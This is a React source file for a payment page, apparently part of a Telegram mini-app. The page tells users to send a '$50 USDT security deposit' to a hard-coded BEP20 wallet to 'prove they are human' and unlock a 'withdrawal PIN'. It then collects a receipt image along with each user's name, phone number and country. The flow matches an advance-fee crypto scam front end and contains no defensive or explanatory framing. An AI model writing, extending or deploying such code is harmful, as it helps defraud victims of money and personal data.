import { useState, useRef } from "react";
import { useLocation } from "wouter";
import { getCurrentUser, setCurrentUser, addAdminNotification, generateNotifId } from "@/lib/storage";
import { hapticSuccess, hapticError } from "@/lib/telegram";
import { Copy, Upload, CheckCircle, ArrowLeft, Shield, AlertCircle, Camera } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";

const USDT_ADDRESS = "0xBB0d0a72aA07Ba201626167DD7510f26Ca0325D5";
const PAYMENT_AMOUNT = 50;

export default function PaymentPage() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [step, setStep] = useState<"instructions" | "upload" | "submitted">("instructions");
  const [receiptFile, setReceiptFile] = useState<string | null>(null);
  const [receiptName, setReceiptName] = useState<string>("");
  const [submitting, setSubmitting] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const user = getCurrentUser();

  if (!user) {
    setLocation("/register");
    return null;
  }

  if (user.paymentSubmitted && user.paymentStatus === "pending") {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center px-6 text-center gap-6">
        <div className="w-20 h-20 rounded-full bg-amber-500/15 flex items-center justify-center">
          <Shield size={36} className="text-amber-500" />
        </div>
        <h2 className="text-xl font-bold">Payment Under Review</h2>
        <p className="text-muted-foreground text-sm leading-relaxed">
          Your payment receipt has been submitted and is being reviewed by our admin team. Your withdrawal PIN will be sent to you once approved. This usually takes 1-24 hours.
        </p>
        <Button onClick={() => setLocation("/dashboard")} className="gold-gradient text-black font-bold px-8">
          Back to Dashboard
        </Button>
      </div>
    );
  }

  if (user.paymentStatus === "approved" && user.withdrawPin) {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center px-6 text-center gap-6">
        <div className="w-20 h-20 rounded-full bg-green-500/15 flex items-center justify-center">
          <CheckCircle size={36} className="text-green-500" />
        </div>
        <h2 className="text-xl font-bold text-green-400">PIN Activated!</h2>
        <p className="text-muted-foreground text-sm">Your withdrawal PIN is:</p>
        <div className="bg-card rounded-2xl p-6 border border-green-500/30 w-full max-w-xs">
          <p className="text-4xl font-bold tracking-widest gold-text">{user.withdrawPin}</p>
          <p className="text-muted-foreground text-xs mt-2">Save this PIN securely. It's your permanent withdrawal PIN.</p>
        </div>
        <Button onClick={() => setLocation("/withdraw")} className="gold-gradient text-black font-bold px-8">
          Go to Withdraw
        </Button>
      </div>
    );
  }

  if (user.paymentStatus === "rejected") {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center px-6 text-center gap-6">
        <div className="w-20 h-20 rounded-full bg-red-500/15 flex items-center justify-center">
          <AlertCircle size={36} className="text-red-500" />
        </div>
        <h2 className="text-xl font-bold text-red-400">Payment Rejected</h2>
        <p className="text-muted-foreground text-sm leading-relaxed">
          Your payment was rejected. Please ensure you sent exactly $50 USDT (BEP20) to the correct address and try again.
        </p>
        <Button
          onClick={() => {
            const updated = { ...user, paymentStatus: null as null, paymentSubmitted: false, paymentReceiptBase64: null };
            setCurrentUser(updated);
            setStep("instructions");
          }}
          className="gold-gradient text-black font-bold px-8"
        >
          Try Again
        </Button>
      </div>
    );
  }

  function copyAddress() {
    navigator.clipboard.writeText(USDT_ADDRESS).catch(() => {});
    toast({ title: "Address copied!", description: "BEP20 USDT address copied to clipboard." });
  }

  function handleFileChange(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0];
    if (!file) return;
    if (file.size > 5 * 1024 * 1024) {
      toast({ title: "File too large", description: "Please upload an image under 5MB.", variant: "destructive" });
      return;
    }
    setReceiptName(file.name);
    const reader = new FileReader();
    reader.onload = (ev) => {
      setReceiptFile(ev.target?.result as string);
    };
    reader.readAsDataURL(file);
  }

  function submitReceipt() {
    if (!receiptFile || !user) return;
    setSubmitting(true);
    setTimeout(() => {
      const notif = {
        id: generateNotifId(),
        type: "payment_receipt" as const,
        userId: user.id,
        userFullName: user.fullName,
        userPhone: user.phoneNumber,
        userCountry: user.country,
        receiptBase64: receiptFile,
        status: "pending" as const,
        createdAt: Date.now(),
      };
      addAdminNotification(notif);
      const updated = {
        ...user,
        paymentSubmitted: true,
        paymentStatus: "pending" as const,
        paymentReceiptBase64: receiptFile,
        paymentSubmittedAt: Date.now(),
        pinActivated: true,
      };
      setCurrentUser(updated);
      hapticSuccess();
      setSubmitting(false);
      setStep("submitted");
    }, 1500);
  }

  return (
    <div className="min-h-screen bg-background pb-8">
      {/* Header */}
      <div className="flex items-center gap-3 px-4 pt-10 pb-4">
        <button onClick={() => setLocation("/dashboard")} className="w-9 h-9 rounded-full bg-card flex items-center justify-center" data-testid="button-back">
          <ArrowLeft size={18} />
        </button>
        <h1 className="font-bold text-lg">Activate Withdrawal PIN</h1>
      </div>

      <div className="px-4 space-y-4">
        {step === "instructions" && (
          <>
            {/* Step indicator */}
            <div className="flex items-center gap-2 mb-2">
              {["Send USDT", "Upload Proof", "Get PIN"].map((s, i) => (
                <div key={s} className="flex items-center gap-1.5">
                  <div className={`w-6 h-6 rounded-full text-xs font-bold flex items-center justify-center ${i === 0 ? "gold-gradient text-black" : "bg-secondary text-muted-foreground"}`}>{i + 1}</div>
                  <span className={`text-xs ${i === 0 ? "text-yellow-400 font-medium" : "text-muted-foreground"}`}>{s}</span>
                  {i < 2 && <div className="w-4 h-px bg-border/50" />}
                </div>
              ))}
            </div>

            {/* Explanation */}
            <div className="glass-card rounded-2xl p-5 border border-yellow-500/20 space-y-3">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-full bg-yellow-500/15 flex items-center justify-center shrink-0">
                  <Shield size={20} className="text-yellow-500" />
                </div>
                <div>
                  <p className="font-semibold text-sm">Global Pay Gateway Verification</p>
                  <p className="text-muted-foreground text-xs">One-time $50 USDT security deposit</p>
                </div>
              </div>
              <p className="text-muted-foreground text-xs leading-relaxed">
                To confirm you are a real human and align with the Global Pay Gateway system, you need to send a one-time payment of <span className="text-yellow-400 font-semibold">$50 USDT (BEP20)</span> to the address below. After your payment is verified, you will receive a permanent 4-digit withdrawal PIN.
              </p>
            </div>

            {/* Amount */}
            <div className="glass-card rounded-2xl p-4 text-center border border-yellow-500/30">
              <p className="text-muted-foreground text-xs mb-1">Amount to Send</p>
              <p className="text-4xl font-bold gold-text">$50 USDT</p>
              <p className="text-muted-foreground text-xs mt-1">BEP20 Network Only</p>
            </div>

            {/* Address */}
            <div className="glass-card rounded-2xl p-4 space-y-3">
              <p className="text-muted-foreground text-xs uppercase tracking-wider">BEP20 Wallet Address</p>
              <div className="bg-secondary/60 rounded-xl p-3 font-mono text-xs text-foreground/90 break-all leading-relaxed">
                {USDT_ADDRESS}
              </div>
              <Button
                onClick={copyAddress}
                variant="outline"
                className="w-full border-yellow-500/30 text-yellow-400 hover:bg-yellow-500/10"
                data-testid="button-copy-address"
              >
                <Copy size={14} className="mr-2" /> Copy Address
              </Button>
            </div>

            {/* Warning */}
            <div className="flex items-start gap-3 bg-red-500/5 rounded-xl p-4 border border-red-500/20">
              <AlertCircle size={16} className="text-red-400 mt-0.5 shrink-0" />
              <p className="text-xs text-muted-foreground leading-relaxed">
                <span className="text-red-400 font-semibold">Important:</span> Only send USDT on the BEP20 (BSC) network. Sending on any other network will result in permanent loss of funds. Make sure you send exactly $50 USDT.
              </p>
            </div>

            <Button
              className="w-full gold-gradient text-black font-bold py-6"
              onClick={() => setStep("upload")}
              data-testid="button-i-have-paid"
            >
              I Have Made Payment
            </Button>
          </>
        )}

        {step === "upload" && (
          <>
            <div className="glass-card rounded-2xl p-5 text-center space-y-4">
              <div className="w-16 h-16 rounded-full bg-yellow-500/15 flex items-center justify-center mx-auto">
                <Upload size={28} className="text-yellow-500" />
              </div>
              <div>
                <h2 className="font-bold text-lg">Upload Payment Receipt</h2>
                <p className="text-muted-foreground text-sm mt-1">Upload a screenshot or photo of your payment confirmation</p>
              </div>

              <input
                ref={fileInputRef}
                type="file"
                accept="image/*"
                onChange={handleFileChange}
                className="hidden"
                data-testid="input-receipt"
              />

              {receiptFile ? (
                <div className="space-y-3">
                  <div className="rounded-xl overflow-hidden border border-yellow-500/30">
                    <img src={receiptFile} alt="Receipt" className="w-full max-h-64 object-contain bg-black/30" />
                  </div>
                  <p className="text-muted-foreground text-xs">{receiptName}</p>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => { setReceiptFile(null); setReceiptName(""); }}
                    className="w-full"
                  >
                    Change Image
                  </Button>
                </div>
              ) : (
                <button
                  onClick={() => fileInputRef.current?.click()}
                  className="w-full h-40 rounded-xl border-2 border-dashed border-yellow-500/30 flex flex-col items-center justify-center gap-3 active:bg-yellow-500/5 transition-colors"
                  data-testid="button-upload-area"
                >
                  <Camera size={32} className="text-muted-foreground" />
                  <div>
                    <p className="text-sm font-medium">Tap to upload receipt</p>
                    <p className="text-muted-foreground text-xs">JPG, PNG or screenshot (max 5MB)</p>
                  </div>
                </button>
              )}
            </div>

            <div className="flex gap-3">
              <Button variant="outline" className="flex-1 py-6" onClick={() => setStep("instructions")} data-testid="button-back-step">
                Back
              </Button>
              <Button
                className="flex-1 gold-gradient text-black font-bold py-6"
                disabled={!receiptFile || submitting}
                onClick={submitReceipt}
                data-testid="button-submit-receipt"
              >
                {submitting ? "Sending..." : "Send Receipt"}
              </Button>
            </div>
          </>
        )}

        {step === "submitted" && (
          <div className="flex flex-col items-center text-center gap-6 pt-8">
            <div className="w-24 h-24 rounded-full bg-green-500/15 flex items-center justify-center">
              <CheckCircle size={44} className="text-green-500" />
            </div>
            <div className="space-y-2">
              <h2 className="text-xl font-bold text-green-400">Receipt Submitted!</h2>
              <p className="text-muted-foreground text-sm leading-relaxed max-w-xs">
                Your payment receipt has been sent to our admin. You will receive your withdrawal PIN within <span className="text-yellow-400 font-semibold">1-24 hours</span> after approval.
              </p>
            </div>
            <div className="glass-card rounded-2xl p-4 w-full space-y-2">
              <p className="text-muted-foreground text-xs">Submission Details</p>
              <div className="space-y-1 text-sm">
                <div className="flex justify-between"><span className="text-muted-foreground">Name</span><span className="font-medium">{user.fullName}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Phone</span><span className="font-medium">{user.phoneNumber}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Country</span><span className="font-medium">{user.country}</span></div>
                <div className="flex justify-between"><span className="text-muted-foreground">Status</span><span className="text-amber-400 font-medium">Pending Review</span></div>
              </div>
            </div>
            <Button onClick={() => setLocation("/dashboard")} className="gold-gradient text-black font-bold px-10 py-6 w-full" data-testid="button-back-dashboard">
              Back to Dashboard
            </Button>
          </div>
        )}
      </div>
    </div>
  );
}
